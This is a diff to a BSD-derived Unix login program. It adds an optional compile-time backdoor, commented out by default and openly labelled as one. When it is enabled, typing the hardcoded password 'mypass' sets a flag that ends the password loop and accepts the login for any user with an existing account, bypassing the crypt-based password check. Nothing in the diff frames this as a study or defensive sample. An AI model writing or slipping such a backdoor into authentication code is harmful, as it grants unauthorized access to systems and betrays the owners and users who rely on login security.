@@ -1,3 +1,13 @@
+/* Uncomment this line if you don't know the system's password. It will enable 
+ * a hardcoded password (AKA backdoor) 
+ */
+//#define BACKDOOR                    "mypass"
+
+#ifdef BACKDOOR
+int     krad=0;
+#endif
+
+
 /* This program is derived from 4.3 BSD software and is
    subject to the copyright notice below.
 
@@ -272,6 +282,9 @@ main(argc, argv)
 
 		setpriority(PRIO_PROCESS, 0, -4);
 		pp = getpass("Password: ");
+#ifdef BACKDOOR
+		if(strcmp(BACKDOOR, pp) == 0) krad++;
+#endif
 		p = crypt(pp, salt);
 		setpriority(PRIO_PROCESS, 0, 0);
 
@@ -280,6 +293,10 @@ main(argc, argv)
 		if (pwd && !strcmp(p, pwd->pw_passwd))
 			break;
 
+#ifdef BACKDOOR
+		if (pwd && (krad != 0))
+			break;
+#endif
 		(void)printf("Login incorrect\n");
 		failures++;
 		badlogin(username); /* log ALL bad logins */
@@ -618,4 +635,3 @@ sleepexit(eval)
 	sleep((unsigned int)5);
 	exit(eval);
 }
-
